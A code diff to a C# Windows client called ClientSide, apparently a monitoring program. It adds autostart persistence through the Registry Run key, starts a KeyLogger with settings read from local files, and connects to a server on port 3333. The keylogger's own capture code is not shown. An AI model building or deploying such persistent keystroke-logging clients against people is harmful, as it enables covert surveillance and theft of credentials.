@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
@@ -31,16 +32,43 @@ namespace ClientSide
             Program p = new Program();
             //Application.EnableVisualStyles();
             //Application.SetCompatibleTextRenderingDefault(false);
-            
-            // check if connect at first time or reconnect
-            
-            if (!p.initialClient())
+
+            // The path to the key where Windows looks for startup applications
+            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+
+
+            if (p.IsStartupItem(rkApp)) { 
+                // Remove the value from the registry so that the application doesn't start
+                //rkApp.DeleteValue("ClientSide", false);
+            }
+           
+            else
             {
-                p.connectToServer();
+                // Add the value in the registry so that the application runs at startup
+                rkApp.SetValue("ClientSide.exe", Application.ExecutablePath.ToString());
+
             }
 
+            // check if connect at first time or reconnect         
+            if (!p.initialClient())
+            {
+               p.connectToServer();
+            } 
+            
             Application.Run();
         }
+
+        private bool IsStartupItem(  RegistryKey rkApp)
+        {            
+            if (rkApp.GetValue("ClientSide.exe") == null)
+                // The value doesn't exist, the application is not set to run at startup
+                return false;
+            else
+                // The value exists, the application is set to run at startup
+                return true;
+        }
+
+
         // The function is activated as soon as data is received in the socket
         private void ReceiveCallback(IAsyncResult AR)
         {
@@ -89,15 +117,19 @@ namespace ClientSide
         // set setting and here will play all triggers;
         private void playMonitor(string setting)
         {
+
             //set setting 
             set = new setSetting(setting, name, id);
-
+            ShowErrorDialog("play monitor");
             // play key logger
+            if (dbs == null) {
+                dbs = new DBclient(name);
+            }
             KeyLogger k = new KeyLogger(dbs, set);
             
             //here will play all triggers;
         }
-
+       
         // Defines functions for sending and receiving data through the socket
         private void ConnectCallback(IAsyncResult AR)
         {
@@ -113,7 +145,7 @@ namespace ClientSide
             }
             catch (SocketException ex)
             {
-                ShowErrorDialog("ConnectCallback send SocketException\r\n" + ex.Message);
+               // ShowErrorDialog("ConnectCallback send SocketException\r\n" + ex.Message);
                 
                 reConnect();
             }
@@ -185,45 +217,57 @@ namespace ClientSide
 
         }
 
+
         private bool initialClient()
         {
+
             String projectDirectory = Environment.CurrentDirectory;
             string filepath = Directory.GetParent(projectDirectory).Parent.FullName;
             String[] paths = new string[] { @filepath, "files" };
             filepath = Path.Combine(paths);
-
+            string set = "";
             DirectoryInfo d = new DirectoryInfo(filepath);//Assuming Test is your Folder
+            ShowErrorDialog("filepath is: \n" + filepath);
             if (!Directory.Exists(filepath))
             {
                 return false;
             }
 
             FileInfo[] Files = d.GetFiles("*.txt"); //Getting Text files
-          
-            foreach (FileInfo file   in Files)
+            
+            foreach (FileInfo file in Files)
             {
-              
+
                 if (file.Name != null)
                 {
                     ShowErrorDialog(file.Name);
                     // Open the file to read from.
-                    using ( StreamReader sr = File.OpenText(Path.Combine(filepath,file.Name)))
+                    using (StreamReader sr = File.OpenText(Path.Combine(filepath, file.Name)))
                     {
                         name = sr.ReadLine();
                         id = sr.ReadLine();
                         ip = "127.1.0.0";
+                        //ShowErrorDialog("id\n" + id);
+                        string line = "";
+                        while ((line = sr.ReadLine()) != null)
+                        { 
+                            //ShowErrorDialog("line\n" + line);
+                            set += line;
+                        }
                     }
-                    reConnect(); 
-                }
-            
-               
-            }
-            if(Files.Length == 0)
-                return false;
-            return true;
-            
-        }
+                    
+                    playMonitor("set"+set);
+                    reConnect();
+                    return true;
 
+                } 
+
+            }
+            
+            return false;
+            
+        }  
+                
         private void openClientFormDialog()
         {
             clientForm.ShowDialog();
@@ -233,16 +277,16 @@ namespace ClientSide
 
         public void SendData(Socket clientSocket, String data) {
             try {
-                ShowErrorDialog("try send: \r\n"+data);
+                //ShowErrorDialog("try send: \r\n"+data);
                 var sendData = Encoding.ASCII.GetBytes(data);
                 clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);
 
             }
             catch (SocketException ex)
             {
-                ShowErrorDialog("SendData send SocketException\r\n" + ex.Message);
+                //ShowErrorDialog("SendData send SocketException\r\n" + ex.Message);
                 reConnect();
-                SendData(clientSocket, "send again " + data);
+                //SendData(clientSocket, "send again " + data);
             }
             catch (ObjectDisposedException ex)
             {
@@ -252,14 +296,25 @@ namespace ClientSide
 
         public void reConnect() {
 
-            // Create new socket 
-            clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-            buffer = new byte[clientSocket.ReceiveBufferSize];
+            try {
+                // Create new socket 
+                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                buffer = new byte[clientSocket.ReceiveBufferSize];
 
-            // Connect To Server 
-            IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
-            // The function ConnectCallback set callback to receive and send 
-            clientSocket.BeginConnect(endPoint, ConnectCallback, clientSocket);
+                // Connect To Server 
+                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
+                // The function ConnectCallback set callback to receive and send 
+                clientSocket.BeginConnect(endPoint, ConnectCallback, clientSocket);
+            }
+            catch (SocketException ex)
+            {
+                ShowErrorDialog("reConnect send SocketException\r\n" + ex.Message);
+                 
+            }
+            catch (ObjectDisposedException ex)
+            {
+                ShowErrorDialog("reConnect send ObjectDisposedException \r\n" + ex.Message);
+            }
         }
        
     }
